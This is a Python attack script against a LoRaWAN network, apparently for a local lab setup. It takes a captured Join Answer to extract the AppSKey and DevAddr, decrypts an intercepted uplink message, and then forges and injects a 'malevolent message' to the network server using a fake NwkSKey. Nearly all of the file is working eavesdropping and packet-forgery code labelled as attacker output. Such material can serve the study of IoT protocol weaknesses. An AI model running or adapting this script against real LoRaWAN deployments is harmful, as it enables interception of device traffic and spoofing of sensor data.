import socket
from Crypto.Hash import CMAC
from Crypto.Cipher import AES

# Computes a 4-byte MIC using AES-CMAC
def generate_MIC(AESKey, payload):
    cmac_obj = CMAC.new(AESKey, ciphermod=AES)
    cmac_obj.update(payload)
    MIC = cmac_obj.digest()[:4]  # LoRaWAN uses only the first 4 bytes
    return MIC

# Constructs and transmits an Unconfirmed Uplink packet
def uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, msg):
    MHDR = b'\x40'  # Unconfirmed Data Up
    FCtrl = b'\x00'
    FCnt += 1  # Increment frame counter
    FHDR = DevAddr + FCtrl + FCnt.to_bytes(2, 'little')
    FPort = b'\x01'  # Application default port
    direction = 0  # Uplink

    FRMPayload = encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, msg)
    MACPayload = FHDR + FPort + FRMPayload

    B0 = generate_block0(direction, DevAddr, FCnt, MACPayload)
    input_block = B0 + MHDR + MACPayload
    MIC = generate_MIC(NwkSKey, input_block)

    to_transmit_pkt = MHDR + MACPayload + MIC
    sock.sendto(to_transmit_pkt, ("127.0.0.1", 9000))  # Send to Network Server

    return FCnt

# Encrypts FRMPayload using AES in CTR-like mode
def encrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, plaintext):
    text_in_bytes = plaintext.encode()
    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(text_in_bytes) + block_size - 1) // block_size
    encrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +
            b'\x00\x00\x00\x00' +
            bytes([direction & 0xFF]) +
            DevAddr[::-1] +
            FCnt.to_bytes(4, 'little') +
            b'\x00' +
            bytes([i])
        )
        Si = aes.encrypt(Ai)
        block = text_in_bytes[(i - 1) * block_size: i * block_size]
        encrypted += bytes(a ^ b for a, b in zip(block, Si))

    return encrypted

# Generates the B0 block used for MIC computation
def generate_block0(direction, DevAddr, FCnt, MACPayload):
    B0 = (
        b'\x49' +
        b'\x00\x00\x00\x00' +
        bytes([direction & 0xFF]) +
        DevAddr[::-1] +
        FCnt.to_bytes(4, 'little') +
        b'\x00' +
        bytes([len(MACPayload)])
    )
    return B0

# Decrypts FRMPayload using known AppSKey
def decrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, ciphertext):
    aes = AES.new(AppSKey, AES.MODE_ECB)
    block_size = 16
    n_blocks = (len(ciphertext) + block_size - 1) // block_size
    decrypted = b''

    for i in range(1, n_blocks + 1):
        Ai = (
            b'\x01' +
            b'\x00\x00\x00\x00' +
            bytes([direction & 0xFF]) +
            DevAddr[::-1] +
            FCnt.to_bytes(4, 'little') +
            b'\x00' +
            bytes([i])
        )
        Si = aes.encrypt(Ai)
        block = ciphertext[(i - 1) * block_size: i * block_size]
        decrypted += bytes(a ^ b for a, b in zip(block, Si))

    return decrypted

###################################################################################

NwkSKey = bytes.fromhex('8F2D3C5B9A6E4F72B1C0A7D8E39146FA')  # Fake NwkSKey used to inject forged packet

while True:
    # Get Join Accept packet directed to the AS captured from Wireshark (hex string without spaces)
    join_answer = input("Insert Join Answer packet containing AppSKey (9001 -> 9002) from Wireshark: ")
    # Get intercepted unconfirmed uplink packet
    uul_pkt = input("Insert intercepted unconfirmed uplink packet from Wireshark: ")

    join_answer = bytes.fromhex(join_answer)
    uul_pkt = bytes.fromhex(uul_pkt)

    print(f"[ATTACKER] Intercepted Join Answer: {list(join_answer)}")
    print(f"[ATTACKER] Intercepted UpLink Packet: {list(uul_pkt)}")

    # Extract AppSKey and DevAddr from the Join Answer
    AppSKey = join_answer[:16]
    DevAddr = join_answer[16:]

    FCnt = uul_pkt[6:8]
    FCnt = int.from_bytes(FCnt, 'little')
    direction = 0

    # Extract and decrypt intercepted payload
    FOptsLen = uul_pkt[5] & 0x0F
    FRMPayload_start = 8 + FOptsLen
    FRMPayload = uul_pkt[FRMPayload_start + 1:-4]
    decrypted = decrypt_FRMPayload(AppSKey, DevAddr, FCnt, direction, FRMPayload)

    print(f"[ATTACKER] Message eavesdropped decrypted: '{decrypted.decode()}'")

    # Inject a fake message using spoofed keys
    mal_msg = input("Insert malevolent message: ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    Fcnt = uncofirmed_uplink(AppSKey, NwkSKey, DevAddr, FCnt, mal_msg)
    print("[ATTACKER] Malevolent message forwarded to NS")
    print("-------------------------------------------------")